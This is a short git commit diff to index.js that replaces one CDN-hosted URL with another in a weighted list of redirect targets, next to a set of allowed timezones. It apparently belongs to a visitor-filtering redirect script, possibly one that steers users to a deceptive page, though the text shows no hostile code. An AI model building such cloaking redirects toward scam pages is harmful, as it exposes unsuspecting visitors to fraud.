d0dd56e5a837b299ba9c547e06199e4ba8f024f1
paalakash <palaksh452@gmail.com>
2026-06-30 10:27:30 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://zonezani12.b-cdn.net/Win0codejInfowj2n/index.html", weight: 1.0 }
+    { url: "https://mukiudji.b-cdn.net/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
